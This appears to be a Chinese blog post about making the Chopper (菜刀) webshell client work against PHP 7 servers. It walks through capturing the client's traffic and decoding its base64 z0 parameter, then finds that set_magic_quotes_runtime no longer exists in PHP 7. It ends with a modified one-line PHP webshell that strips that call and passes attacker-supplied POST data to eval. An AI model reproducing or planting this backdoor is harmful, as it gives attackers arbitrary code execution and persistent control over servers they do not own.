**背景介绍**  
  
  

    起因就是以前某个同事问我，php7连接不上菜刀的webshell该怎么解决。

  

![](../Images/58443654ccfe66f43ec31cdc36803ec9.png)  
**测试过程**  
  

   查看webshell返回的指纹X-Powered-By: PHP/7.3.4

![](../Images/19c408166807e08c499b04859dea1aea.png)

     当菜刀连接php7环境下的webshell的时候，会爆出500的错误

     如下图

![](../Images/72f6bfd5806e15f826e5525507e1c488.png)

    要解决这个，我们需要知道是什么原因导致的报错，进行抓包，菜刀的请求参数如下

![](../Images/7f701516460785f4e45207107b720358.png)     数据包

![](../Images/a4bc6ebe98a37bda8eb4cbcccac066b0.png)

     一共两个参数,cmd(这个也就是webshell的密码)和z0

![](../Images/fa3abeb50b9698bde0ae9d61207deca5.png)

    z0参数base64解码之后如下

![](../Images/a71172868bf2dd5e6cc4862a41662dee.png)

   思考菜刀的大概逻辑就是，z0参数base64解码之后就是需要执行的PHP代码，通过cmd参数(这个也就是webshell的密码)的eval执行,其实还有z1和z2等等，但是主要出错是在参数z0

   然后把z0解码之后的代码，放在本地调试，找出报错的原因，打开报错提示

![](../Images/d91218bf221304f5176434fbf2389ae3.png)    查看官网文档，知道了这个set\_magic\_quotes\_runtime函数在php7之后的版本已经被删除了，无法使用了

![](../Images/c83aec87c9980505442a0a9ef4945afb.png)         所以一句话要修改成这样，在eval执行前，去掉

*   

```

```

*   
*   
*   
*   
*   
*   

```
<?php$z0=str_replace('@set_magic_quotes_runtime(0);','',base64_decode($_POST['z0']));$_POST['z0']=base64_encode($z0);@eval($_POST['cmd']);?>

```
